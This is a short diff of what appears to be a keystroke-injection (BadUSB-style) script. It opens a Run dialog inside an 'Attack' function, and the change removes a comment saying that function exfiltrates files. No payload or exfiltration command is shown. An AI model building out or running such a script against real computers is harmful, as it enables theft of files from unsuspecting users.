@@ -6,7 +6,7 @@
 layout('us');				// Set keyboard layout to US
 var Ready = "False"			// Sets Ready to false beacuse we are not ready to begin the attack
 
-function Attack() { 		// Initalizes the function Attack that acually exfiltrates the files
+function Attack() { 		// Initalizes the function Attack
   delay(2200);				// Delay to make sure that File Explorer doesent take focus
   press("GUI r");		  	// Opens a run command
   delay(500);
